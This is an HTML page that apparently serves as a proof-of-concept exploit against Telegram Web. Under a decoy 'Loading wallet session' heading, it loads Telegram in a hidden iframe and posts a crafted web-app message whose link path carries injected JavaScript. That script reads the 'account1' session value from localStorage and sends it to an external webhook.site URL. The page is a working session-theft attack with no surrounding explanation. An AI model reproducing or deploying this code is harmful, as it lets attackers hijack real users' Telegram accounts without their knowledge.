<!DOCTYPE html>
<html>
  <body>
    <h1>Loading wallet sessionâ€¦</h1>
    <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
    <script>
      const payload = JSON.stringify({
        eventType: 'web_app_open_tg_link',
        eventData: {
          path_full: `/wallet/start?x=${encodeURIComponent(`
            (function() {
              try {
                const data = localStorage.getItem('account1');
                fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data=' + encodeURIComponent(data), {
                  mode: 'no-cors'
                });
              } catch (e) {}
            })()
          `)}`
        }
      });

      window.onload = function () {
        const iframe = document.getElementById("tg_frame");
        iframe.onload = function () {
          iframe.contentWindow.postMessage(payload, "*");
        };
      };
    </script>
  </body>
</html>
